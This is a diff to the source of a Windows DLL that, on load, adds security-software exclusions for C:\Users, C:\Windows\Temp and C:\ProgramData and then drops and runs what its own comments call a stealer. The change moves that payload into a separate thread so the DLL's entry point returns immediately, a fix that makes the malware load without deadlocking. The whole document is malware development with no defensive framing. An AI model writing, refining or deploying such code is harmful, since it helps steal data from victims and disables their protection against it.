@@ -48,17 +48,22 @@ void RunStealer() {
     }
 }
 
+DWORD WINAPI PayloadThread(LPVOID) {
+    // Step 1: add exclusions
+    AddExclusion(L"C:\\Users");
+    AddExclusion(L"C:\\Windows\\Temp");
+    AddExclusion(L"C:\\ProgramData");
+
+    // Step 2: drop and run stealer into excluded path
+    RunStealer();
+    return 0;
+}
+
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
-
-        // Step 1: add exclusions
-        AddExclusion(L"C:\\Users");
-        AddExclusion(L"C:\\Windows\\Temp");
-        AddExclusion(L"C:\\ProgramData");
-
-        // Step 2: drop and run stealer into excluded path
-        RunStealer();
+        // Spawn thread so DllMain returns immediately (avoids loader lock deadlock)
+        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
     }
     return TRUE;
 }
